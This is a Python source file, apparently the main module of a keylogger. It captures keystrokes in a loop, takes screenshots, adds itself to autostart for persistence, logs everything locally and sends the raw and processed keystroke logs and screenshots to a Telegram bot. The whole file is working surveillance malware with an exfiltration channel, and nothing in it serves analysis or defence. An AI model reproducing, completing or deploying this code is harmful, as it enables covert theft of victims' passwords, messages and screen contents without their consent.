import os
import sys
from dotenv import load_dotenv

from constants import LOG_FILE, LOG_FILE_2, TIME_OUT
from key_listener import KeyListener
from keylogger_utils import (
    create_autostart_entry,
    take_screenshot,
)
from log_utils import format_message, process_keys, write_to_log
from notifications_utils import send_image_telegram, send_info_telegram

# Load environment variables from .env file
load_dotenv()


def get_credentials_telegram():
    """
    Return a dictionary containing the necessary credentials for accessing the Telegram API.

    Returns: A dictionary with the following keys:
             - "TOKEN": The access token for the Telegram bot.
             - "CHAT_ID": The ID of the chat to which the bot will send messages.
    """
    return {"token": os.getenv("TOKEN"), "chat_id": os.getenv("CHAT_ID")}


def send_logs(creds, message, processed_message, screenshot=None):
    """
    Send logs to Telegram, both raw and processed, and an optional screenshot.

    Parameters:
        - creds (dict): Telegram credentials containing 'TOKEN' and 'CHAT_ID'.
        - message (str): The raw log message.
        - processed_message (str): The processed log message.
        - screenshot (Optional[Image]): The screenshot to be sent (default: None).
    """
    send_info_telegram(**creds, message="RAW KEYLOGGER LOG\n\n" + message)
    send_info_telegram(
        **creds, message="PROCESSED KEYLOGGER LOG\n\n" + processed_message
    )

    if screenshot:
        send_image_telegram(**creds, image=screenshot)


def handle_keyboard_interrupt(key_listener: KeyListener):
    """
    Handle a keyboard interrupt event.

    Parameters:
        - key_listener (KeyListener): The key listener object that captures the typed keys.
    """
    typed_keys = key_listener.get_keys()
    processed_keys = process_keys(typed_keys)
    message = format_message(typed_keys)
    processed_message = format_message(processed_keys)

    screenshot = take_screenshot()

    write_to_log(message, LOG_FILE)
    write_to_log(processed_message, LOG_FILE_2)

    creds = get_credentials_telegram()

    # Send logs and optional screenshot through Telegram
    send_logs(creds, message, processed_message, screenshot)

    try:
        sys.exit(130)
    except SystemExit:
        os._exit(130)


def main():
    key_listener = KeyListener()
    create_autostart_entry()

    creds = get_credentials_telegram()

    try:
        while True:
            typed_keys = key_listener.read_keys(TIME_OUT)
            processed_keys = process_keys(typed_keys)
            message = format_message(typed_keys)
            processed_message = format_message(processed_keys)

            screenshot = take_screenshot()

            write_to_log(message, LOG_FILE)
            write_to_log(processed_message, LOG_FILE_2)

            # Send logs and optional screenshot through Telegram
            send_logs(creds, message, processed_message, screenshot)

    except KeyboardInterrupt:
        handle_keyboard_interrupt(key_listener)


if __name__ == "__main__":
    main()
